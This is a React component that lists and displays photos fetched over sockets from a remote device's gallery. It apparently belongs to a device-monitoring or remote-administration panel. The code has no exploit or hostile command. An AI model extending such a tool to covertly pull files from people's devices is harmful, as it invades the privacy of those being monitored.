import React, { useEffect, useState } from "react";
import { useTranslation } from "react-i18next";
import { Grid, Typography, CircularProgress, Box } from "@mui/material";

import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocketFunctions } from "src/utils/socket";
import { useSocket } from "../../hooks/use-socket";
import MonitorViewer from "../monitorViewer";

import Color from "src/theme/colors";

const GalleryManager = ({ label, device, onClose }) => {
  const { t } = useTranslation();
  const { socket } = useSocket();
  const { onSocketManager, onGetGalleryEvent } = useSocketFunctions();

  const [getListLoading, setGetListLoading] = useState(false);
  const [getImageLoading, setGetImageLoading] = useState(false);
  const [galleryData, setGalleryData] = useState([]);
  const [selectedImageId, setSelectedImageId] = useState(null);
  const [selectedImage, setSelectedImage] = useState(null);

  const [state, setState] = useState({
    width: 720,
    height: 720,
    x: 100,
    y: -120,
    minWidth: 360,
    minHeight: 360,
    maxWidth: 720,
    maxHeight: 720,
  });

  useEffect(() => {
    init();
  }, []);

  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth < 720) {
        setState((prevState) => ({
          ...prevState,
          width: window.innerWidth - 20, // Account for padding
          height: window.innerWidth - 20, // Keep it square
        }));
      } else {
        setState((prevState) => ({
          ...prevState,
          width: 720,
          height: 720,
        }));
      }
    };

    window.addEventListener("resize", handleResize);
    handleResize();

    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  const onGalleryListResponse = (data) => {
    const deviceId = device?.deviceId;
    if (deviceId === data.data?.deviceId) {
      setGalleryData(data.data?.galleryData);
      setGetListLoading(false);
    }
  };

  const init = async () => {
    try {
      const deviceId = device?.deviceId;
      setGetListLoading(true);
      await onSocketManager(label, { deviceId });
      socket.on(`gallery-list-shared-${deviceId}`, onGalleryListResponse);
    } catch (error) {
      console.log("get gallery error:", error);
    }
  };

  const onOneGalleryResponse = (data) => {
    const deviceId = device?.deviceId;
    if (deviceId === data.data?.deviceId) {
      setSelectedImage(data.data?.galleryData);
      setGetImageLoading(false);
    }
  };

  const onSelectImage = async (image) => {
    setGetImageLoading(true);
    setSelectedImageId(image.imageId);
    const data = {
      filepath: image?.filepath,
      deviceId: device?.deviceId,
    };
    await onGetGalleryEvent(`${SocketIOPublicEvents.get_gallery}`, { data });

    socket.on(`gallery-one-shared-${device?.deviceId}`, onOneGalleryResponse);
  };

  const onCloseModal = async () => {
    try {
      onClose(false);
    } catch (error) {
      console.log("close monitor modal error", error);
    }
  };

  return (
    <MonitorViewer initialState={state} onClose={onCloseModal}>
      <div style={{ position: "relative", width: "100%", height: "100%" }}>
        <Box
          sx={{
            display: "flex",
            flexDirection: { md: "row", xs: "column" },
            overflowY: "auto",
            height: "100%",
            py: { md: 1, xs: 5 },
            gap: "15px",
          }}
        >
          <div
            style={{
              flex: "40%",
              overflowY: "auto",
              border: `solid 1px ${Color.background.border}`,
              borderRadius: "5px",
            }}
          >
            {getListLoading ? (
              <Grid
                sx={{
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "center",
                  alignItems: "center",
                  zIndex: 1,
                  color: "gray",
                  width: "100%",
                  height: "100%",
                  zIndex: 1,
                  color: "white",
                }}
              >
                <Grid
                  sx={{
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    backgroundColor: Color.background.purple,
                    width: "30px",
                    height: "30px",
                    borderRadius: "5px",
                  }}
                >
                  <CircularProgress sx={{ color: "white" }} size={20} />
                </Grid>
              </Grid>
            ) : (
              <div style={{ backgroundColor: Color.background.main }}>
                {galleryData.length === 0 ? (
                  <Typography style={{ color: "white" }}>
                    {t("devicesPage.managers.gallery-noimage")}
                  </Typography>
                ) : (
                  galleryData.map((image, index) => (
                    <Typography
                      key={index}
                      onClick={() => onSelectImage(image)}
                      style={{
                        cursor: "pointer",
                        marginBottom: "8px",
                        color: selectedImageId === image.imageId ? Color.text.purple : "white",
                        padding: "5px 10px",
                        borderRadius: "5px",
                        transition: "background-color 0.3s",
                      }}
                      onMouseEnter={(e) => {
                        if (!selectedImage || selectedImage.imageId !== image.imageId) {
                          e.currentTarget.style.backgroundColor = Color.background.purple_opacity;
                        }
                      }}
                      onMouseLeave={(e) => {
                        if (!selectedImage || selectedImage.imageId !== image.imageId) {
                          e.currentTarget.style.backgroundColor = "transparent";
                        }
                      }}
                    >
                      {image.filepath.split("/").pop()}
                    </Typography>
                  ))
                )}
              </div>
            )}
          </div>

          <div
            style={{
              flexBasis: "70%",
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              overflow: "hidden",
              border: `solid 1px ${Color.background.border}`,
              borderRadius: "5px",
            }}
          >
            {getImageLoading ? (
              <Grid
                sx={{
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "center",
                  alignItems: "center",
                  zIndex: 1,
                  color: "gray",
                  width: "100%",
                  height: "100%",
                  zIndex: 1,
                  color: "white",
                }}
              >
                <Grid
                  sx={{
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    backgroundColor: "#564FEE",
                    width: "30px",
                    height: "30px",
                    borderRadius: "5px",
                  }}
                >
                  <CircularProgress sx={{ color: "white" }} size={20} />
                </Grid>
              </Grid>
            ) : selectedImage ? (
              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                  width: "100%",
                  height: "100%",
                }}
              >
                <img
                  src={`data:image/jpeg;base64,${selectedImage}`}
                  style={{ maxWidth: "100%", maxHeight: "100%", objectFit: "contain" }}
                />
              </div>
            ) : (
              <Typography sx={{ fontSize: "14px", textAlign: "center", color: "white" }}>
                {t("devicesPage.managers.gallery-select-image")}
              </Typography>
            )}
          </div>
        </Box>
      </div>
    </MonitorViewer>
  );
};

export default GalleryManager;
